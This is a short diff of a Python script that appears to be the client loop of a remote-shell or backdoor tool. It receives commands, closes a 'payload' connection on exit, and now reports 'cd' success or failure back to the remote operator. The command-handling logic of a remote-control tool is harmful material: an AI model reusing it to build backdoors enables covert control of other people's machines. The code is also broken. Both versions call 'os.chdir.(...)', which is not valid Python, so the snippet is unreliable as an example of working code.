@@ -24,10 +24,14 @@ while True:
 		payload.close()
 		break
 	
-	# Change Directory (cd)
-	elif cmd[:2] == "cd": # Check initial part (cd) slice using string [:index]
-		# use os module and chdir function (change directory)
-		os.chdir.(cmd[3:]) # give the command the 2nd argument after (cd)
+	elif cmd[:2] == "cd":
+		# Handle Change Directory (cd) Exception
+		try:
+			os.chdir.(cmd[3:])
+		except FileNotFoundError:
+			send_data(b"File not found")
+		else:
+			send_data(b"Changed directory")
 		continue
 
 	try:
